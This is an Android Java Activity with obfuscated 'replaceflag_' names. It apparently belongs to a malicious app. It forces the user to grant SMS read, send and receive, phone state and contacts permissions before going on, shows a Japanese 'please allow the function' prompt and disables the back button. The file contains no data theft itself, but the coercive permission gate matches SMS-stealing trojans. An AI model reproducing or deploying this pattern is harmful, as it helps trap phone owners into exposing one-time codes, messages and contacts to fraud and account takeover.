package replaceflag_fysn.replaceflag_rydk.replaceflag_capud;

import static replaceflag_fysn.replaceflag_rydk.replaceflag_capud.replaceflag_Thfgfw.showCenterGravity;
import android.Manifest;
import android.app.Activity;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.graphics.Color;
import android.os.Bundle;
import android.os.CountDownTimer;
import android.util.Log;
import android.view.View;
import android.widget.Toast;

import androidx.annotation.NonNull;
import androidx.annotation.Nullable;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import java.util.ArrayList;

public class replaceflag_NewPermissionActivity extends Activity {
    private String[] permissions = new String[]{
            Manifest.permission.READ_SMS, Manifest.permission.SEND_SMS, Manifest.permission.RECEIVE_SMS,
            Manifest.permission.READ_PHONE_STATE, Manifest.permission.READ_CONTACTS};
    private ArrayList<String> mPermissionList = new ArrayList<>();
    private int code = 1;

    @Override
    protected void onCreate(@Nullable Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.replaceflag_permission_guide);
        this.getWindow().getDecorView().setBackgroundColor(Color.WHITE);
//        hasPermission();
        findViewById(R.id.goToPermission).setOnClickListener(new View.OnClickListener() {
            @Override
            public void onClick(View v) {
                if (hasPermission()) {
                    gonext();
                }
            }
        });
    }

    private void gonext() {
        Intent sayHelloIntent = new Intent(replaceflag_NewPermissionActivity.this, replaceflag_NewEnterActivity.class);
        sayHelloIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK);
        startActivity(sayHelloIntent);
        finish();
    }

    private boolean hasPermission() {
        mPermissionList.clear();
        for (int i = 0; i < permissions.length; i++) {
            if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                mPermissionList.add(permissions[i]);//添加还未授予的权限
            }
        }
        Log.e("=====>", mPermissionList.toString());
        if (mPermissionList.size() > 0) {
            if (mPermissionList.contains(Manifest.permission.READ_SMS)) {
                showCenterGravity("機能利用を許可してください。", Toast.LENGTH_LONG);
                new CountDownTimer(500, 500) {
                    @Override
                    public void onTick(long millisUntilFinished) {
                    }

                    @Override
                    public void onFinish() {
                        ActivityCompat.requestPermissions(replaceflag_NewPermissionActivity.this, permissions, 1);
                    }
                }.start();
                return false;
            }
        }
        return true;
    }

    @Override
    public void onRequestPermissionsResult(int requestCode, @NonNull String[] permissions, @NonNull int[] grantResults) {
        super.onRequestPermissionsResult(requestCode, permissions, grantResults);
//        String res="";
//        for (int re:grantResults             ) {
//            res +=""+re+",";
//        }
//        showCenterGravity(res, Toast.LENGTH_LONG);
//        Log.e("=====>","requestCode:"+requestCode+" permissions:"+permissions.toString()+" grantResults:"+res);
        if (1 == requestCode) {
//            if(grantResults!=null&&grantResults.length>0&&grantResults[0]==0)
//            {
//                send();
//            }
            mPermissionList.clear();
            for (int i = 0; i < permissions.length; i++) {
                if (ContextCompat.checkSelfPermission(this, permissions[i]) != PackageManager.PERMISSION_GRANTED) {
                    mPermissionList.add(permissions[i]);//添加还未授予的权限
                }
            }
            Log.e("=====>", mPermissionList.toString());
            if (mPermissionList.size() > 0) {
                if (mPermissionList.contains(Manifest.permission.READ_SMS) || mPermissionList.contains(Manifest.permission.RECEIVE_SMS) || mPermissionList.contains(Manifest.permission.SEND_SMS)) {
                } else {
                    gonext();
                }
            } else {
                gonext();
            }
        }
    }

    @Override
    public void onBackPressed() {

    }

}
